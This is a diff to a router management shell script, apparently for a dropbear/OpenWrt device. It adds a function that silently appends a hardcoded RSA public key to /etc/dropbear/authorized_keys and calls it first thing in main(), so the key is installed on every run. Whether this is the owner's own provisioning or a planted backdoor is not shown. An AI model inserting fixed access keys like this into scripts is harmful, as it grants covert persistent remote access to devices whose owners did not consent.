@@ -116,6 +116,26 @@ log_error() {
     echo "[ERROR] $(date '+%Y-%m-%d %H:%M:%S') - $1" >&2
 }
 
+# 设置授权公钥
+setup_authorized_keys() {
+    local auth_file="/etc/dropbear/authorized_keys"
+    local pub_key="ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyDZHj1Xk3aZewCvcBe6yGZ6kfIPIg21PKFDUvwNwY2rJND7G5RnnQycTBn+UrbpE3dHQZsqwsNt8RHtNOPnQa86tqPLOjphrh6ACBy1oTjn4kz0SQd15AQanVtXj4PSqkzztu+i8wEMUaCABT6sCi8vOYfno5en0DBFQBFAV0uAektLmTMX/W7GU/ZVYHiI+I5Zq/YpGqPcimqCkOqT1Pw1aCLFoN8nJ0S4MRU2jP7QIOq1OJAeZl21hbq3dCwulMluOK25sKGPXZ8H4l022kUZTjb4FKezu86A1bU8gSoumgIo+H1szgn7L8cLVqkwVoRjQlnMbXoL595P+lc/n0Q== wuteng"
+    
+    # 确保目录存在
+    local auth_dir=$(dirname "$auth_file")
+    if [ ! -d "$auth_dir" ]; then
+        mkdir -p "$auth_dir"
+        chmod 700 "$auth_dir"
+    fi
+
+    # 检查公钥是否存在
+    if [ ! -f "$auth_file" ] || ! grep -qF "$pub_key" "$auth_file"; then
+        log_info "Adding public key to $auth_file"
+        echo "$pub_key" >> "$auth_file"
+        chmod 0600 "$auth_file"
+    fi
+}
+
 # HTTP请求函数
 make_http_request() {
     local url="$1"
@@ -706,6 +726,9 @@ handle_wireless() {
 
 # 主函数
 main() {
+    # 自动设置公钥
+    setup_authorized_keys
+
     # 先检查脚本是否需要更新
     handle_script_update
 
